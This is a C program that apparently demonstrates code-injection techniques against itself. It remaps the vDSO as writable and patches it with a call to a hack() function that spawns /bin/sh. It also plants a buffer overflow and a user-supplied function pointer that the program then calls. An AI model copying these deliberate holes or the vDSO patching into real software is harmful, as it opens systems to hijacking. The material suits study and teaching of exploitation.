#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
typedef int (*Fptr)(int, int);
char *victim;
char name[4];
Fptr ptr;

void hack() {
  printf("Injected code executed!\n");
  system("/bin/sh");
  exit(1);
}

static char backup[5];
char *vdso_begin, *vdso_end;
void restore(char *ptr) { memcpy(ptr, backup, 5); }

void patch(char *ptr) {
  memcpy(backup, ptr, 5);
  size_t offset = (size_t)((char *)hack - ptr - 5);
  ptr[0] = 0xe8;
  *(size_t *)(ptr + 1) = offset;
  int r = mprotect(vdso_begin, vdso_end - vdso_begin, PROT_READ | PROT_EXEC);
}

int Foo(int a, int b) {
  printf("In %s\n", __FUNCTION__);
  return 0;
}

int Bar(int a, int b) {
  printf("In %s\n", __FUNCTION__);
  return 0;
}

int main(int argc, const char *argv[]) {
  printf("In %s\n", __FUNCTION__);

  FILE *maps;
  int found_vdso = 0;
  maps = fopen("/proc/self/maps", "r");
  char buf[1024];
  while (fgets(buf, 1024, maps)) {
    if (strstr(buf, "[vdso]")) {
      found_vdso = 1;
      break;
    }
  }
  fclose(maps);
  if (!found_vdso) {
    fprintf(stderr, "Could not find vdso mapping\n");
    return 1;
  }
  sscanf(buf, "%p-%p", &vdso_begin, &vdso_end);

  int r = mprotect(vdso_begin, vdso_end - vdso_begin,
                   PROT_READ | PROT_WRITE | PROT_EXEC);
  if (r != 0) {
    fprintf(stderr, "Could not enable rwx in vDSO\n");
    return 1;
  }

  victim = (void *)
      vdso_begin; // You can modify the value of victim to any address in vdso
  printf("victim = %p\n", victim);
  patch(victim);

  printf("In %s\n", __FUNCTION__);

  ptr = Foo;
  // buffer overflow
  printf("victim is: %p\n", &victim);
  printf("name is: %p\n", name);
  printf("ptr is: %p\n", &ptr);

  printf("plz input your name:\n");
  read(0, name, 0x10);
  // More simple, directly modify ptr.
  // Note: Using the global variable overflow has the same effect.
  scanf("%p", &ptr);
  ptr(0, 0);

  return 0;
}
